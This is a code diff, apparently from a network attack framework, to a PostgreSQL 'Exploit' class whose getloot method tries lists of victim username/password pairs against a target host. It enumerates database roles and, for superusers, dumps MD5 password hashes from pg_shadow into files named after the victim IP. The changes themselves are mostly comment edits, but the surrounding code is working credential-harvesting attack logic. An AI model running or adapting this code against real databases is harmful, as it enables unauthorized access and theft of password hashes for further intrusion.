@@ -6,15 +6,14 @@ class postgresql(Exploit):
     def __init__(self):
         self.name = "postgres"
         self.port = 5432
-    # def attack(self, ip_address):
-    #     pass
 
     def getloot(self, ip_address, credentials):
         print("going into getloot for postgres")
         more_loot = []
         loot_dict = {}
         ip_address = str(ip_address)
-        # go through each secure username
+
+        # go through each username/password combo
         for victim in credentials:
             username = victim[0]
             password = victim[1]
@@ -39,14 +38,14 @@ class postgresql(Exploit):
                 cur.execute("select * from pg_roles")
             except (psycopg2.OperationalError, psycopg2.InternalError) as e:
                 continue
-            # opening up returns
+
             print(f'{Color.BYLLW}Success. Gathering all usernames.{Color.END}', file=self.output)
             for l in cur.fetchall():
                 # adds if the username is not already in there
                 if loot_dict.get(l[0]) == None:
                     loot_dict[l[0]] = ""
 
-            # tries to possibly get md5 hashes if in case it is a superuser
+            # attempts to get md5 hashes in the case that the user is a superuser
             try:
                 cur.execute("select usename, passwd from pg_shadow")
                 with open(f"./data/{ip_address}_{username}_postgresql_md5.txt", "w") as text_file:
@@ -59,6 +58,7 @@ class postgresql(Exploit):
                 print(f'{Color.BYLLW}No MD5 hashes found.{Color.END}', file=self.output)
                 pass
 
+        # eliminates default postgres roles and copies of the same users 
         for k, v in loot_dict.items():
             if k not in {"serviceuser", "pg_signal_backend", "pg_monitor", "pg_read_all_settings", "pg_read_all_stats", "pg_stat_scan_tables"}:
                 more_loot.append((k, None))
